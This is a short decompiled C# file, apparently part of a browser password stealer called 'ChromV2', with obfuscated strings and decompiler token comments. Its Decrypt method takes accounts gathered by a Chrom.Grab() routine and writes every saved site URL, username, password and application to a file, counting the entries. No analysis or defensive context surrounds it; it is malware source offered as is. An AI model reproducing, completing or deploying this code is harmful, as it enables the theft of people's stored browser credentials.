using System;
using System.Collections.Generic;
using System.IO;
using SmartAssembly.StringsEncoding;

namespace ChromV2
{
	// Token: 0x020000A2 RID: 162
	public class Dec
	{
		// Token: 0x06000314 RID: 788 RVA: 0x0002A1E8 File Offset: 0x000283E8
		public static void Decrypt(string path)
		{
			List<Account> list = Chrom.Grab();
			File.WriteAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394229));
			foreach (Account account in list)
			{
				File.AppendAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394228) + account.URL + Environment.NewLine);
				File.AppendAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394187) + account.UserName + Environment.NewLine);
				File.AppendAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394202) + account.Password + Environment.NewLine);
				File.AppendAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394153) + account.Application + Environment.NewLine);
				File.AppendAllText(path + ChromV266351.Strings.Get(107394218), ChromV266351.Strings.Get(107394164) + Environment.NewLine);
				Dec.colvo++;
			}
		}

		// Token: 0x040001FE RID: 510
		public static int colvo;
	}
}
